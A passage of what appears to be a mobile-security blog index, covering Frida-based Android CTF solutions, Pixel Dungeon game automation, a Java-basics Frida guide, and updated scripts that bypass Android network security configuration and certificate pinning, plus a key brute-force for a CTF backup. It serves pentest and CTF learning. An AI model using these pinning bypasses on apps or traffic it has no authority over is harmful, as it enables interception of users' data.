found that the custom class was not being called. After reading and checking the script I found that between a.J and webview.loadUrl, the HttpTrafficActivity class was setting a custom webViewClient, overwriting the custom class I wrote.\na.D(a.J((WebView) y(R.id.webviewTask), \u0026#34;webviewTask!!.settings\u0026#34;, true, true, false, false, true), WebSettings.LayoutAlgorithm.SINGLE_COLUMN, 2, true, \u0026#34;hpAndro\u0026#34;); ... webView3.setWebChromeClient(new h()); g.c(this); Object systemService = getSystemService(\u0026#34;connectivity\u0026#34;); if (systemService != null) { ... if (z) { WebView webView4 = (WebView) y(R.id.webviewTask); g.c(webView4); webView4.loadUrl(\u0026#34;http://hpandro.raviramesh.info/http_task.php\u0026#34;); So I had to create a new script. In this case the solution was much more simpler than what I wrote initially, because I only had to overwrite the shouldInterceptRequest from that class:\nJava.perform( function () { var WebViewClient = Java.use(\u0026#39;v0.d.a.c.a.d.h.g\u0026#39;); WebViewClient.shouldInterceptRequest.overload(\u0026#39;android.webkit.WebView\u0026#39;, \u0026#39;android.webkit.WebResourceRequest\u0026#39;).implementation = function (webView, request) { ... if (!isFavicon) { readNewStream(inputStr); ... webResourceRes = WebResourceResponse.$new(\u0026#34;text/html\u0026#34;,\u0026#34;utf-8\u0026#34;, inputStr); } else { webResourceRes = WebResourceResponse.$new(\u0026#34;image/vnd.microsoft.icon\u0026#34;,\u0026#34;gzip\u0026#34;, inputStr); } return webResourceRes; } }); This second script worked as desired, achieving the goal of solving the challenge with Frida.\nIn the following link https://github.com/CesarMRodriguez/lunesdemobile/tree/main/Sesion%201 you can find the following content:\ntest: Application written with Android Studio to practice the script from step 2. There you will find two Fragments. The first fragment has the code used in step 1, and the second one has an empty structure in order to generate the script manually. hpandro.apk: Application with challenges http_task.js: First script shown http_task2.js: Second script shown ","permalink":"https://cmrodriguez.me/blog/hpandro-1/","tags":["Frida","Android","CTF","Challenge","HTTP"],"title":"Solving CTF with Frida - Part 1"},{"categories":["Frida","Android","PixelDungeon","Automation"],"contents":"Hi there! I come this time with a new project, automating the resolution of a game. I\u0026rsquo;ve been thinking about doing it since I found the game in 2019 for one of the presentations I did about Frida. I was hesitant of doing it because it is complex project, there are lots of things to do, a lot of tests on each step, and long hours of coding and thinking. But after around two years of trying to forget about it, the idea keeps getting in my mind over and over again. So I dediced to give it a try, and so the journey begins\u0026hellip;\nThis is the first post of a series focused on the automation of the resolution of a game with Frida. I\u0026rsquo;ll try to create a Frida script that will start a game and will play it till it finishes. Finish does not mean winning it necessarily, but getting to the game over state (trying my best to get a script with good results). I will explain later why it is not possible to achieve a 100% winning rate.\nI chose Pixel Dungeon for many reasons:\nIt is an RPG game, which are my favourite type of games. It is open source, so I just have to focus on understanding the code and creating the script rather than reversing the application. It is written fully on Java, so it is a good way to practice Frida\u0026rsquo;s Java API. Note:This series of posts are not security oriented. I\u0026rsquo;ll explain how I solved each step of the automation algorithm.\nAbout the game Pixel Dungeon is a roguelike(1) RPG game, and the objective of the game is go through all the levels of a dungeon. The player can choose between four character classes (Warrior, Mage, Rogue \u0026amp; Huntress), which have different abilities and stats. The character has different stats, a character level and HP. The player looses when the character\u0026rsquo;s HP gets to 0. In order to level-up the character has to kill monsters that will spawn while the user crawls the dungeon.\nThe dungeon is divided in levels. Each level is divided in different rooms which are connected through corridors, with stairs to go up and down the dungeon. Each level is generated randomly when the user gets into it. The algorithm assures that there is always an accesible stair to go up and down.\nThe developer of the game added a mechanics related to food consumption. The character needs to eat food regularly in order to not get to the starving state, where the player will loose 1 HP after he does a couple of steps. Food is rarely scarce, so the player needs to manage all the resources in order to avoid getting to that state. Because of this, the easiest strategies of farming monsters and getting levels won\u0026rsquo;t work. Also as everything is generated randomnly, the player will not be able to find food to give the character, and they will get to the starving state.\nThat are the reasons the game is hard to play, and it is impossible to get to a 100% win rate.\n(1) From Wikipedia:\nRoguelike is a sub-genre of role-playing video games, characterized by random level generation, tile-based graphics and permanent death.\nStrategy to solve the game I\u0026rsquo;ll use a basic strategy in order to solve this game, which is the one I use in order to play the game as well. It is a greedy strategy:\nget in each level of the dungeon. try to go through all the rooms killing all monsters found during the process and getting all the items. use food whenever the character is getting in the starved state. use health potions whenever the user gets to low levels. There are multiple upgrades to the strategy, that I will add after I achieve the first iteration of the algorithm.\nPixel Dungeon concepts and internals Character The application has the following classes related to the character:\nFrom this class diagram the most important attributes that will be used in the algorithms are:\nChar.pos: position of the character in the map. Char.HT: temporary hitpoints. When this value gets to 0 the character dies, finishing the game. The main stats can be found in the Hero class:\nHero.attackSkill Hero.defenseSkill Hero.STR Hero.exp In order to make the characted do things, the application calls the Hero.call() method. This method checks the type of the HeroAction stored in the curAction attribute and then it calls the actXxxx(HeroAction) based on it. As an example if in the curAction the application stored a HeroAction.Move object, whenever the Hero.call() is invoked, the Hero will end up calling the actMove() method, sending as a parameter the HeroAction.Move from the curAction attribute.\nAs an example, the following code can be used to move a character from one position to another:\nfunction moveCharacter(endPos) { Java.perform(function () { Java.choose(\u0026#34;com.watabou.pixeldungeon.actors.hero.Hero\u0026#34;, { onMatch: function (hero) { var heroObject = hero; var moveActionClass = Java.use(\u0026#34;com.watabou.pixeldungeon.actors.hero.HeroAction$Move\u0026#34;); var moveAction = moveActionClass.$new(endPos); heroObject.curAction.value = moveAction; heroObject.act();\t}, onComplete: function () { } }); }); } In this case we use the Java.choose API call, because we want the Hero instance created by the application when the game starts.\nLevel \u0026amp; Map The following diagram shows the main classes related to the level and map creation and update:\nThe map is divided in discrete units of space, that we will call \u0026ldquo;pixels\u0026rdquo;. Each pixel has a terrain type (the information about the values are stored in the Terrain class). Each terrain type is associated with an integer value, which can also be seen in the Terrain type. The map is basically a matrix of pixels. In the game this is stored as an array, and whenever the application needs a position, it makes count to convert the array to a matrix. This can be done, because the width of the map is a constant. Each pixel has an id, that is the position of the pixel in the array, which will be used to execute operations and validations during the game lifecycle.\nThe following image shows the values of the positions in a Room:\nThe following script was used to print the positions of the cells:\nfunction printMap(charObj, level) { var pos = charObj.pos.value; var y = Math.floor(pos / 32); var x = pos % 32; var RANGE = 6; var minY = Math.max(y-RANGE,0); var maxY = Math.min(y+RANGE,31); var minX = Math.max(x-RANGE,0); var maxX = Math.min(x+RANGE,31); for (var i = minY; i\u0026lt;= maxY; i++) { var line = \u0026#34;\u0026#34;; for (var j = minX; j \u0026lt; maxX; j++) { var posPrint = i * 32 + j; //values in Terrain.java if (posPrint == pos) { line += \u0026#34;* \u0026#34;; } else { line += posPrint + \u0026#34; \u0026#34;; } } console.log(line); } } Java.perform(function () { Java.choose(\u0026#34;com.watabou.pixeldungeon.actors.hero.Hero\u0026#34;, { onMatch: function (hero) { var heroObject = hero; //cast a Char var charClass = Java.use(\u0026#34;com.watabou.pixeldungeon.actors.Char\u0026#34;); var charObj = Java.cast(hero,charClass); var Dungeon = Java.use(\u0026#34;com.watabou.pixeldungeon.Dungeon\u0026#34;); var level = Dungeon.level.value; printMap(charObj, level); }, onComplete: function () { } }); }); The following image shows the values stored in the map attribute for the same Room:\nThe only change from the above script was the printMap function:\nfunction printMap(charObj, level) { var pos = charObj.pos.value; var y = Math.floor(pos / 32); var x = pos % 32; var RANGE = 6; var minY = Math.max(y-RANGE,0); var maxY = Math.min(y+RANGE,31); var minX = Math.max(x-RANGE,0); var maxX = Math.min(x+RANGE,31); for (var i = minY; i\u0026lt;= maxY; i++) { var line = \u0026#34;\u0026#34;; for (var j = minX; j \u0026lt; maxX; j++) { var posPrint = i * 32 + j; //values in Terrain.java if (posPrint == pos) { line += \u0026#34;* \u0026#34;; } else { line += level.map.value[posPrint] + \u0026#34; \u0026#34;; } } console.log(line); } } Another important attribute from the Level class is visited, which has an Array of booleans. This array has one item per pixel, and it stores if the user visited the pixel or not. Visit a pixel means it gets into the field of view of the character.\nIn this case the visited = true is mapped to 1 and the visited = false is mapped to 0. The only change from the above script was the printMap function:\nfunction printMap(charObj, level) { var pos = charObj.pos.value; var y = Math.floor(pos / 32); var x = pos % 32; var RANGE = 6; var minY = Math.max(y-RANGE,0); var maxY = Math.min(y+RANGE,31); var minX = Math.max(x-RANGE,0); var maxX = Math.min(x+RANGE,31); for (var i = minY; i\u0026lt;= maxY; i++) { var line = \u0026#34;\u0026#34;; for (var j = minX; j \u0026lt; maxX; j++) { var posPrint = i * 32 + j; //values in Terrain.java if (posPrint == pos) { line += \u0026#34;* \u0026#34;; } else if (level.visited.value[posPrint]) { line += \u0026#34;1 \u0026#34;; } else { line += \u0026#34;0 \u0026#34;; } } console.log(line); } } The attribute fieldOfView attribute holds which pixels can be seen by the character. It depends on the place where the user is, the max range of sight (8 pixels), and if there is any object that blocks the sight (like a wall or a closed door). This attribute is reloaded each time the character moves.\nIn this case the visible pixels are mapped to 1 and the others are mapped to 0. The only change from the above script was the printMap function:\nfunction printMap(charObj, level) { var pos = charObj.pos.value; var y = Math.floor(pos / 32); var x = pos % 32; var RANGE = 6; var minY = Math.max(y-RANGE,0); var maxY = Math.min(y+RANGE,31); var minX = Math.max(x-RANGE,0); var maxX = Math.min(x+RANGE,31); for (var i = minY; i\u0026lt;= maxY; i++) { var line = \u0026#34;\u0026#34;; for (var j = minX; j \u0026lt; maxX; j++) { var posPrint = i * 32 + j; //values in Terrain.java if (posPrint == pos) { line += \u0026#34;* \u0026#34;; } else if (level.fieldOfView.value[posPrint]) { line += \u0026#34;1 \u0026#34;; } else { line += \u0026#34;0 \u0026#34;; } } console.log(line); } } With all this information, in next Phase, I\u0026rsquo;ll try to generate an algorithm that crawls a level in the dungeon. See you soon!\n","permalink":"https://cmrodriguez.me/blog/auto-pixeldungeon-1/","tags":["Frida","Android","PixelDungeon","Automation"],"title":"Automating Game Resolution - PixelDungeon Edition - Phase 1"},{"categories":["Frida","Android"],"contents":"TL;DR In this blogpost I show the update of the analysis on different scripts that executes the bypass of network security configuration with Frida on devices with API 27 to 29.\nIn the previous post I explain how and why each script works. It is not mandatory to read it before reading this one: https://cmrodriguez.me/blog/nsc-bypass/\nIt has been a while since I did the first analysis of different scripts used to bypass the network security configuration of Android devices. In the moment I did it we did not have in Genymotion (the VM I use for pentesting) devices with Android 27 and above, so I limited the analysis on the devices with API 24 to 26. Now we can create Android emulated devices till API 29, so I thought it was a good moment to do a review on the scripts I had collected for the first post.\nI\u0026rsquo;ll use the same criteria to execute the analysis as I did before. I created three applications with different network security configurations:\nAn application that used the default NSC configuration (without network-security-config xml file) - called BypassNSC An application with a NSC file that used only system certificates - called BypassNSC2. An application with a NSC file that enforced the certificate pinning - called BypassNSC3. Each application has three different ways to execure requests:\nOKHttp (it is also used in retrofit and volley also) HttpsURLConnection WebView (Chromium in API 25 and 26, and Default WebView in API 24). The scripts I used are the following ones:\nnetwork-security-config-bypass-1.js network-security-config-bypass-2.js network-security-config-bypass-3.js network-security-config-bypass-cr.js \u0026lt;\u0026ndash; this is the one I created The following github repository has all the applications I developed and the scripts I used.\nhttps://github.com/CesarMRodriguez/network-security-config-frida-2\nThe following is a screenshot of the table I created with the results of the analysis:\nnetwork-security-config-bypass-1.js Original reference: Link\nI had to change the network-security-config-bypass-1.js. It threw some errors that in previous version of frida-cli worked. The errors were related to undefined variables. The change to avoid this error was to add in some variable declarations were the let or var modified.\nnetwork-security-config-bypass-2.js Original Reference: Link\nI had to change the network-security-config-bypass-2.js. It threw the same kind of errors as in the firs script.\nnetwork-security-config-bypass-3.js Original Reference: Link\nIn this case I did not need to change anything from the original script\nnetwork-security-config-bypass-cr.js For API 28 and AÏ 29, the original script does not work. There is a change in the signatures of the methods hooked by the library, which throws the following error:\n[NSC 28::com.example.bypassnsc]-\u0026gt; Error: ManifestConfigSource$DefaultConfigSource(): specified argument types do not match any of: .overload(\u0026#39;boolean\u0026#39;, \u0026#39;android.content.pm.ApplicationInfo\u0026#39;) at ge (frida/node_modules/frida-java-bridge/lib/class-factory.js:584) at frida/node_modules/frida-java-bridge/lib/class-factory.js:923 at /network-security-config-bypass-2.js:16 at frida/node_modules/frida-java-bridge/lib/vm.js:11 at frida/node_modules/frida-java-bridge/index.js:446 at frida/node_modules/frida-java-bridge/index.js:431 at je (frida/node_modules/frida-java-bridge/lib/class-factory.js:633) at frida/node_modules/frida-java-bridge/lib/class-factory.js:616 The fix was the following one:\nif (DefaultConfigSource.$new.argumentTypes[1].className == \u0026#34;android.content.pm.ApplicationInfo\u0026#34;) { var ApplicationInfo = Java.use(\u0026#34;android.content.pm.ApplicationInfo\u0026#34;); var appInstance = ApplicationInfo.$new(); appInstance.targetSdkVersion.value = ANDROID_VERSION_M; appInstance.targetSandboxVersion.value = 1; return DefaultConfigSource.$new(true,appInstance); } The change is neccesary because the constructor of \u0026ldquo;DefaultConfigSource\u0026rdquo; changed to the following one:\nDefaultConfigSource(boolean usesCleartextTraffic, ApplicationInfo info) { mDefaultConfig = NetworkSecurityConfig.getDefaultBuilder(info) .setCleartextTrafficPermitted(usesCleartextTraffic) .build(); } I also had to set some values in the second parameter (object from class ApplicatoinInfo). In order to see what we need to set, we had to check the implementation of the method getDefaultBuilder from the NetworkSecurityConfig class:\npublic static Builder getDefaultBuilder(ApplicationInfo info) { Builder builder = new Builder() .setHstsEnforced(DEFAULT_HSTS_ENFORCED) // System certificate store, does not bypass static pins. .addCertificatesEntryRef( new CertificatesEntryRef(SystemCertificateSource.getInstance(), false)); final boolean cleartextTrafficPermitted = info.targetSdkVersion \u0026lt; Build.VERSION_CODES.P \u0026amp;\u0026amp; info.targetSandboxVersion \u0026lt; 2; builder.setCleartextTrafficPermitted(cleartextTrafficPermitted); // Applications targeting N and above must opt in into trusting the user added certificate // store. if (info.targetSdkVersion \u0026lt;= Build.VERSION_CODES.M \u0026amp;\u0026amp; !info.isPrivilegedApp()) { // User certificate store, does not bypass static pins. builder.addCertificatesEntryRef( new CertificatesEntryRef(UserCertificateSource.getInstance(), false)); } return builder; } we can see that we have to set the \u0026ldquo;targetSdkVersion\u0026rdquo; to 23 in order to make the application to import UserCertificateSource, and we need to set targetSandboxVersion to 1, so the clearTextTraffic is set to true.\nWith this change, the script worked as intended. I also checked the parameter types to make the script compatible with older versions as well.\nConclusion: The results from the analysis of the scripts used for the network security config bypass show that they are as effective in the newer APIs as they were in the old ones. Two of the scripts works in all scenarios (network-security-config-1.js) and (network-security-config-cr.js).\n","permalink":"https://cmrodriguez.me/blog/nsc-bypass-2/","tags":["Frida","Android"],"title":"Network Security Configuration bypasses with Frida (update API 27-29)"},{"categories":["Misc","CTF"],"contents":"In this post I will solve the challenge called Serializado, created for the Ekoparty 2020 - Mobile Hacking Space CTF. In this challenge we have the following file.\nserializable.ab\nThe serializable.ab seems to be a back-up created through an Android OS. In order to get the content of the file we can execute the following command:\ndd if=serializable.ab bs=1 skip=24 | python -c \u0026#34;import zlib,sys;sys.stdout.write(zlib.decompress(sys.stdin.read()))\u0026#34; | tar -xvf - This will generate the following result:\napps/com.mhs.serializado/manifest apps/com.mhs.serializado/a/base.apk apps/com.mhs.serializado/r/key.ser apps/com.mhs.serializado/r/content.txt In order to check what is each file, we have to open the base.apk file, which is the application backed-up in this file:\njadx-gui apps/com.mhs.serializado/a/base.apk In this application we have two activitied, SplashActivity.java (which is a splash screen page with no logic), and MainActivity.java which has two buttons btnStore and btnLoad.\nWe check what the btnStore does by going through the decompiled source code:\nget bytes from txtSecretPassword value: String content = MainActivity.this.txtSecretPassword.getText().toString(); ... byte[] key = content.getBytes(StandardCharsets.UTF_8); Generate a CipherManagement class: CipherManagement cipherManagement = new CipherManagement(); int i = 0; cipherManagement.x1 = key[0]; cipherManagement.x2 = key[1]; cipherManagement.x3 = key[2]; cipherManagement.x4 = key[3]; cipherManagement.x5 = key[4]; cipherManagement.x6 = key[5]; cipherManagement.x7 = key[6]; cipherManagement.x8 = key[7]; cipherManagement.x9 = key[8]; cipherManagement.x10 = key[9]; cipherManagement.x11 = key[10]; cipherManagement.x12 = key[11]; cipherManagement.x13 = key[12]; cipherManagement.x14 = key[13]; cipherManagement.x15 = key[14]; cipherManagement.x16 = key[15]; cipherManagement.generateSecret(); Call serializeObject from class Serializer. This class does, but here we can see that there is a key.ser String, which is the name of a file in the backup found. Serializer.serializeObject(cipherManagement, \u0026#34;key.ser\u0026#34;); Generates a file called ontent.txt with the value taken from txtContent, encrypted through the CipherManagement class, and then encoded in Base64. That is the second file we have in the backup. String multiLines = MainActivity.this.txtContent.getText().toString(); try { FileOutputStream fOut = new FileOutputStream(new File(\u0026#34;/data/data/com.mhs.serializado/content.txt\u0026#34;)); OutputStreamWriter myOutWriter = new OutputStreamWriter(fOut); String[] lines = multiLines.split(\u0026#34;\\n\u0026#34;); try { int length = lines.length; int i2 = 0; while (i2 \u0026lt; length) { myOutWriter.append(Base64.encodeToString(cipherManagement.encrypt(lines[i2]), i)); i2++; i = 0; } } catch (Exception e) { e.printStackTrace(); } myOutWriter.close(); fOut.flush(); fOut.close(); } catch (IOException e2) { Log.e(\u0026#34;Exception\u0026#34;, \u0026#34;File write failed: \u0026#34; + e2.toString()); } In the case of the btnLoad, the application does the following:\nRecover the key from the key.ser file: CipherManagement cipherManagement = (CipherManagement) Serializer.deserializeObject(\u0026#34;key.ser\u0026#34;); if (cipherManagement == null) { Toast.makeText(MainActivity.this.getApplicationContext(), \u0026#34;Nothing encrypted yet\u0026#34;, 1).show(); return; } Sets the keyin the txtSecretPassword field: byte[] key = {cipherManagement.x1, cipherManagement.x2, cipherManagement.x3, cipherManagement.x4, cipherManagement.x5, cipherManagement.x6, cipherManagement.x7, cipherManagement.x8, cipherManagement.x9, cipherManagement.x10, cipherManagement.x11, cipherManagement.x12, cipherManagement.x13, cipherManagement.x14, cipherManagement.x15, cipherManagement.x16}; cipherManagement.generateSecret(); MainActivity.this.txtSecretPassword.setText(new String(key, StandardCharsets.UTF_8)); Gets the content of the content.txt file, and tries to decode it. First it decodes the content of the fiñe with a Base64 decoder, then the application tries to decrypt the decoded text with the CipherManagement class, and the result is being set in the txtContext field. new InputStreamReader(new FileInputStream(new File(\u0026#34;/data/data/com.mhs.serializado/content.txt\u0026#34;))); StringBuilder resultingContent = new StringBuilder(); if (Build.VERSION.SDK_INT \u0026gt;= 26) { for (String line : Files.readAllLines(Paths.get(\u0026#34;/data/data/com.mhs.serializado/content.txt\u0026#34;, new String[0]), Charset.defaultCharset())) { String decodedLine = cipherManagement.decrypt(Base64.decode(line, 0)); resultingContent.append(decodedLine + \u0026#34;\\n\u0026#34;); } } MainActivity.this.txtContent.setText(resultingContent.toString()); The Serializer stores and loads a Java serialized object in the root package of the application. In this case the object being stored and loaded is a ChiperManagement instance, which holds the key.\nAfter the analysis of the source code, we need to install the application and upload the backup.\nSo we first try to install the apk:\nadb install apps/com.mhs.serializado/a/base.apk which returns the following output:\nPerforming Streamed Install adb: failed to install apps/com.mhs.serializado/a/base.apk: Failure [INSTALL_FAILED_TEST_ONLY: installPackageLI] this error is due to a flag of test in the manifest. We need to add a -t option in the adb install command to avoid this error:\nadb install -t apps/com.mhs.serializado/a/base.apk Now we need to restore the backup. As this is trivial in this case I will do it manually:\nadb shell rm /data/data/com.mhs.serializado/content.txt adb shell rm /data/data/com.mhs.serializado/key.ser adb push content.txt /data/data/com.mhs.serializado adb push key.ser /data/data/com.mhs.serializado Now we need to change the user rights on the files. So first you need to know the name of the user assigned by Android to the application, which will depend on the cellphone, so execute:\nadb shell ls -al /data/data/com.mhs.serializado where you will get the a content similar to the following one:\ndrwx------ 4 u0_a118 u0_a118 4096 2020-11-28 17:00 . drwxrwx--x 169 system system 12288 2020-11-09 12:08 .. drwxrws--x 2 u0_a118 u0_a118_cache 4096 2020-08-18 03:10 cache drwxrws--x 2 u0_a118 u0_a118_cache 4096 2020-08-18 03:10 code_cache In this case the user is u0_118, so we execute:\nadb shell chown u0_a118:u0_a118 /data/data/com.mhs.serializado/content.txt adb shell chown u0_a118:u0_a118 /data/data/com.mhs.serializado/key.ser When we try to restore the content we get an error in the log:\nSystem.out I IOException is caught We have no information about what is going on, so let\u0026rsquo;s check the content of the key file. As it is a Java-serialized object, we can use a tool called SerializationDumper (add link here).\njava -jar SerializationDumper-v1.13.jar -f key.ser STREAM_MAGIC - 0xac ed STREAM_VERSION - 0x00 05 Contents TC_OBJECT - 0x73 TC_CLASSDESC - 0x72 className Length - 36 - 0x00 24 Value - com.mhs.serializado.CipherManagement - 0x636f6d2e6d68732e73657269616c697a61646f2e4369706865724d616e6167656d656e74 serialVersionUID - 0xb2 8a 53 35 20 34 41 18 newHandle 0x00 7e 00 00 classDescFlags - 0x02 - SC_SERIALIZABLE fieldCount - 16 - 0x00 10 Fields 0: Byte - B - 0x42 fieldName Length - 2 - 0x00 02 Value - x1 - 0x7831 1: Byte - B - 0x42 ... 15: Byte - B - 0x42 fieldName Length - 2 - 0x00 02 Value - x9 - 0x7839 classAnnotations TC_ENDBLOCKDATA - 0x78 superClassDesc TC_NULL - 0x70 newHandle 0x00 7e 00 01 classdata com.mhs.serializado.CipherManagement values x1 (byte)97 (ASCII: a) - 0x61 x10 ... x6 (byte)57 (ASCII: 9) - 0x39 x7 Exception in thread \u0026#34;main\u0026#34; java.util.NoSuchElementException at java.util.LinkedList.removeFirst(LinkedList.java:270) at java.util.LinkedList.pop(LinkedList.java:801) at nb.deser.SerializationDumper.readByteField(SerializationDumper.java:1369) at nb.deser.SerializationDumper.readFieldValue(SerializationDumper.java:953) at nb.deser.SerializationDumper.readClassDataField(SerializationDumper.java:939) at nb.deser.SerializationDumper.readClassData(SerializationDumper.java:886) at nb.deser.SerializationDumper.readNewObject(SerializationDumper.java:467) at nb.deser.SerializationDumper.readContentElement(SerializationDumper.java:359) at nb.deser.SerializationDumper.parseStream(SerializationDumper.java:331) at nb.deser.SerializationDumper.main(SerializationDumper.java:113) Through the error we get that the serialized file seems to be corrupted. There seems to be three values missing. As we can see in the definition of the class:\npublic class CipherManagement implements Serializable { private transient byte[] inferedKey = new byte[16]; public byte x1; public byte x10; public byte x11; public byte x12; public byte x13; public byte x14; public byte x15; public byte x16; public byte x2; public byte x3; public byte x4; public byte x5; public byte x6; public byte x7; public byte x8; public byte x9; Now we can assume the following:\nThe known values are ordered. We do not know which values are missing. We\u0026rsquo;ll try to test this with alphanumeric (a-zA-Z0-9) and if that does not work we\u0026rsquo;ll test it with printable characters. I built the following java application in order to test this, and make the process faster than using Frida:\npublic static void main(String[] args) { // TODO Auto-generated method stub String content = \u0026#34;jBUwXJdjVaHvZuYfaw/cew==\u0026#34;; byte array[] = Base64.getDecoder().decode(content); CipherManagement cipher = new CipherManagement(); cipher.generateSecret(); CharsetEncoder encoder = Charset.forName(\u0026#34;US-ASCII\u0026#34;).newEncoder(); //starting time printTime(); // rotating positions for (int pos1 = 0; pos1 \u0026lt; 14; pos1++) { for (int pos2 = pos1 + 1; pos2 \u0026lt; 15; pos2++) { for (int pos3 = pos2 + 1; pos3 \u0026lt; 16; pos3++) { setStaticValues(cipher, pos1, pos2, pos3); //bruteforcing just alphanumeric values to check if it returns results fast. for (byte x = 49; x \u0026lt;= 122; x++) { setValue(cipher, pos1, x); for (byte y = 49; y \u0026lt;= 122; y++) { setValue(cipher, pos2, y); for (byte z = 49; z \u0026lt;= 122; z++) { setValue(cipher, pos3, z); cipher.generateSecret(); String decrypted; try { decrypted = cipher.decrypt(array); //this filters the solutions sent to output, but still there are false positives. if (encoder.canEncode(decrypted)) { System.out.println(decrypted); //this loop is just to measure what time it takes to get the key if (\u0026#34;banana_loca\u0026#34;.equals(decrypted)) { printTime(); return; } } } catch (Exception e) { // TODO Auto-generated catch block } } } } } } } } the full source code is in the following repository: solving-serializado\nWith this algorithm I found the key in 13,5 minutes, and decrypted the content of the text that is \u0026ldquo;banana_loca\u0026rdquo;.\n","permalink":"https://cmrodriguez.me/blog/solving-serialized/","tags":null,"title":"CTF - Solving Serialized"},{"categories":["Frida","Android"],"contents":"In this guide I will show how to write scripts in Frida. The idea is not to show how Frida works or what can be done with it, there are plenty of those kind of blogs around. While using this amazing tool I find sometimes hard to know how to write a script in order to make the application do what I want to, and as the documentation does not go too deep on that, sometimes I find myself going through different examples till I find how to solve something related to the syntaxis of the Java bridge. So I wrote this guide in order to concentrate that knowledge in one place.\nThe content is divided in several pages, in order to make it easily searchable. In the content you\u0026rsquo;ll find how to write Java code in the Frida-bridge syntaxis. So I\u0026rsquo;ll go through different Java language features and how to write it as a script in Frida. In order to do this, I wrote an application that has many classes that uses different components (like Interfaces, arrays or anonymous classes). Each page will have a brief introduction of the Java feature (not a through one, as it is only intended to make the user understand what is being done in the code), explain how to do the same with Frida and then an example of how it was done in the demo application. The source code and the application can be downloaded from the following github page: https://github.com/CesarMRodriguez/frida-scripting-guide/\nIndex Primitive types Methods Access to content of classes \u0026ldquo;this\u0026rdquo; reference Arrays Enums Inheritance Interfaces Inner classes Exception handling ","permalink":"https://cmrodriguez.me/blog/frida-scripting-guide/","tags":["Android","Frida","Scripting guide"],"title":"Frida Scripting Guide for Java"},{"categories":["Misc"],"contents":"Hi there! My name is Cesar! It will be next April 3 years, since I am advocated full time to my Security Career. Now I\u0026rsquo;m working as a Security Researcher in Faraday Security Labs. I started my career not knowing what I wanted to do, as my only experience with security was related to development.\nDuring these years I\u0026rsquo;ve been working on different technologies, programming languages, so it was hard for me to find something I particularly liked or wanted to do with my professional career, till I got to do a Mobile application security assessment. It was a mix of Java/Objective-C/Swift (as I am a Java developer this technology is natural for me), hardware, client-side exploitation, native OS library reversing, web application assessment (hybrid libraries) and an endless quantity of frameworks.\nIt was pretty hard for me to start doing mobile assessments, because there are a lot of concepts, restrictions and techniques that are different from the Web security discipline. So in this blog I\u0026rsquo;ll try to help others in the process of getting into the Mobile Security world, and my passion for this environment.\n","permalink":"https://cmrodriguez.me/blog/hello-world/","tags":null,"title":"Hello World!"},{"categories":["Frida","Android"],"contents":"In this post I will explain how to use and instance different data types from Java with Frida. In Java we have the following basic types:\nbyte: Byte-length integer short: Short integer int: Integer long: Long integer float: Single-precision floating point double: Double-precision floating point char: A single character boolean: A Boolean value (true or false) Using integer types The different integer types are casted by frida automatically to the Javascript numeric type, which is capable of holding the the long Java type without loosing information. As an example the following code calls different functions from the BasicTypes class, and they are printed by Frida with no need to cast the types:\nvar BasicTypes = Java.use(\u0026#34;com.blog.testfrida.examples.BasicTypes\u0026#34;); console.log(\u0026#34;addTwoInts: \u0026#34; + BasicTypes.addTwoInts(1,2)); console.log(\u0026#34;addTwoBytes: \u0026#34; + BasicTypes.addTwoBytes(1+1,3)); console.log(\u0026#34;addTwoShorts: \u0026#34; + BasicTypes.addTwoShorts(1-1,4)); console.log(\u0026#34;addTwoLongs: \u0026#34; + BasicTypes.addTwoLongs(1*1,5)); console.log(\u0026#34;addTwoInts: \u0026#34; + BasicTypes.addTwoInts(1/1,2)); console.log** is the function used to print in the frida CLI application output.\nBasicTypes** is the javascript wrapper for the BasicTypes class, binded by using the Java.use function.\nFrida casts automatically values as well in the reimplementation of functions:\nBasicTypes.addTwoBytes.implementation = function (var1,var2) { console.log(\u0026#34;test addTwoBytes\u0026#34;); return 3+4; } BasicTypes.addTwoShorts.implementation = function (var1,var2) { console.log(\u0026#34;test addTwoShorts\u0026#34;); return 3+4; } BasicTypes.addTwoLongs.implementation = function (var1,var2) { console.log(\u0026#34;test addTwoLongs\u0026#34;); return 3+4; } In this case to test the function, it needs to be run from the Java environment, because the changes are not being reflected on the method in the Frida environment, that is why I created in a button in the Main Activity of the application. So in order to trigger the modified behavior you need to click the button in the application.\nUsing boolean types Frida converts automatically from Java boolean type to javascript boolean with no weird behavior. The following example is used to send boolean values from the Frida bridge to Java, and from Java to the script:\nvar testBooleanValues = function () { var BasicTypes = Java.use(\u0026#34;com.blog.testfrida.examples.BasicTypes\u0026#34;); console.log(BasicTypes.negate(false)); console.log(BasicTypes.negate(true)); BasicTypes.negate.implementation = function (var1) { console.log(\u0026#34;test negate\u0026#34;); return false; } } Using floating point types WARNING In floating points we see some differences. The issue comes from the use of float values\nAs an example, when the 23/3 is executed, the Java operation returns 7.666666507720947, because of the limitation on the precision. But javascript by default has an extended precision, so the division returns 7.666666666666667, as the double Java operation does. So be careful when you override a method as there could be issues when some value is sent to a function that works on floats. The following code shows multiple scenarios of float manipulation:\nvar testFloatValues = function () { var BasicTypes = Java.use(\u0026#34;com.blog.testfrida.examples.BasicTypes\u0026#34;); console.log(\u0026#34;native values\u0026#34;); console.log(23.0/3.0); console.log(0.1234567890123/1); console.log(2/5); console.log(\u0026#34;java values\u0026#34;); console.log(BasicTypes.divideFloat(23,3)); console.log(BasicTypes.divideFloat(0.1234567890123,1)); console.log(BasicTypes.divideDouble(2,5)); console.log(BasicTypes.divideDouble(23,3)); console.log(BasicTypes.divideDouble(0.1234567890123,1)); BasicTypes.divideFloat.implementation = function (var1, var2) { console.log(\u0026#34;test divideFloat\u0026#34;); return var1 / var2; } BasicTypes.divideDouble.implementation = function (var1, var2) { console.log(\u0026#34;test divideDouble\u0026#34;); return var1 / var2; } } which returns the following output:\njavascript values\n23/3: 7.666666666666667 0.1234567890123/1: 0.1234567890123 2/5: 0.4 java values\n23/3 (float): 7.666666507720947 0.1234567890123/1 (float): 0.12345679104328156 2/5(float): 0.4 23/3 (double): 7.666666666666667 0.1234567890123/1 (double): 0.1234567890123 Using char types Frida converts automatically from Java char type to javascript char with no weird behavior. The following example is used to send char values from the Frida bridge to Java, and from Java to the script:\nvar testCharValues = function () { var BasicTypes = Java.use(\u0026#34;com.blog.testfrida.examples.BasicTypes\u0026#34;); console.log(BasicTypes.getNextChar(\u0026#39;a\u0026#39;)); console.log(BasicTypes.isCChar(\u0026#39;f\u0026#39;)); console.log(BasicTypes.isCChar(\u0026#39;c\u0026#39;)); BasicTypes.getNextChar.implementation = function (char1) { return \u0026#39;F\u0026#39;; } 